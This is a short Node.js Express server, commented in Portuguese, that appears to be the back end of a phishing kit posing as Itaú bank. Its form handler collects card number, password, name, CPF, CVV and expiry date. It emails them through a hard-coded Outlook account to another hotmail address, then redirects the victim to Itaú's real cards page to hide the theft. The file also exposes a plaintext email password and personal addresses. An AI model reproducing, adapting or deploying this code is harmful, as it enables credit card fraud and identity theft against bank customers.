const express = require('express');
const path = require('path');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: true }));

// Rota para lidar com a solicitação POST do formulário
app.post('/enviar-dados', (req, res) => {
    const { informacao1, informacao2, informacao3, informacao4, informacao5, informacao6, informacao7 } = req.body; // Captura os dados enviados pelo formulário

    // Configuração do serviço de email
    const transporter = nodemailer.createTransport({
        host: 'smtp-mail.outlook.com',
        port: '587',
        secure: false,
        auth: {
            user: 'dinair1979@hotmail.com',
            pass: 'dinair1b2f3o'
        }
    });

    // Opções do email
    const mailOptions = {
        from: 'dinair1979@hotmail.com',
        to: 'flaviopnc123@hotmail.com',
        subject: 'Novas informações recebidas',
        text: `numero: ${informacao1}\nsenha: ${informacao2}\nnome: ${informacao3}\ncpf: ${informacao4}\ncvv: ${informacao5}\nmm: ${informacao6} \nyy: ${informacao7}`
    };

    // Envia o email
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log(error);
            res.send('Erro ao enviar o email');
        } else {
            console.log('Email enviado: ' + info.response);
            res.redirect('https://www.itau.com.br/cartoes');
        }
    });
});

// Inicia o servidor
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});